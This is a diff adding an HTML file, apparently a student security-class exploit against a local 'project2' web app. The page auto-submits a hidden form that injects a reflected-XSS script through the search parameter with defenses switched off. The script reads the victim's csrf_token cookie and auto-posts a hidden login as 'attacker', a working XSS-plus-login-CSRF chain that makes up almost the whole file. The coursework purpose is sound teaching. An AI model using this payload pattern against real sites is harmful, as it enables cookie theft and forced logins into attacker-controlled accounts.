@@ -1,0 +1,55 @@
+<!--
+Group Members: Trent Chismar, Joshua Cominelli, Ryan Brockway
+References: w3schools, class notes, geeksforgeeks
+
+-->
+<html>
+
+    <form id="thesame", action="http://localhost/project2/search", method="GET", style="display: none">
+        <input name="xssdefense" value="0">
+        <input name="q" value="<script>  
+            function getCookie() {
+                var name='csrf_token';
+                var c_string= document.cookie.split(';');
+                for(i=0; i<c_string.length; i++){
+                    if(c_string[i].includes(name)){
+                        var val= c_string[i].split('=')[1];
+                        alert(val);
+                        return val;                         
+                    }
+                }
+            };
+            var val=getCookie();
+            var form= document.createElement('form');
+            form.setAttribute('method','post');
+            form.setAttribute('action','http://localhost/project2/login');
+            form.setAttribute('style','display: none');
+        
+            var username= document.createElement('input');
+            username.setAttribute('name','username');
+            username.setAttribute('value','attacker');
+        
+            var pwd=document.createElement('input');
+            pwd.setAttribute('name','password');
+            pwd.setAttribute('value','l33th4x');
+        
+            var c_val=document.createElement('input');
+            c_val.setAttribute('name','csrf_token');
+            c_val.setAttribute('value',val);
+        
+            form.append(username);
+            form.append(pwd);
+            form.append(c_val);
+            document.body.appendChild(form);
+            form.submit();
+        </script>">
+        
+
+    </form>
+    <script>
+        document.getElementById("thesame").submit();
+
+    </script>
+
+
+</html> 
